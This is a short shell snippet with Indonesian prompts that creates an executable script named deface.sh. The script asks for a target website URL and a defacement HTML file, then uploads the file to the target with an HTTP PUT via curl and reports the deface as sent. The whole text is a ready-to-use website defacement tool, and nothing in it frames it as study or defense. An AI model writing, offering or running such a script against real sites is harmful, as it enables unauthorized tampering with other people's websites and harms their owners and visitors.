cat > deface.sh << EOF
#!/bin/bash
read -p "Masukkan URL target (cth: https://target.com): " url
read -p "Masukkan path file deface (cth: deface.html): " file
curl -T \$file \$url
echo "Deface coba dikirim ke: \$url"
EOF
chmod +x deface.sh
